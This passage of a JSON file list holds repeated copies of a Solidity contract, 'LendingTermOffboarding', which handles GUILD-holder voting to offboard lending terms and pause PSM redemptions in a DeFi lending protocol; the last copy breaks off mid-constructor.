exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToke"
    }
  ]
}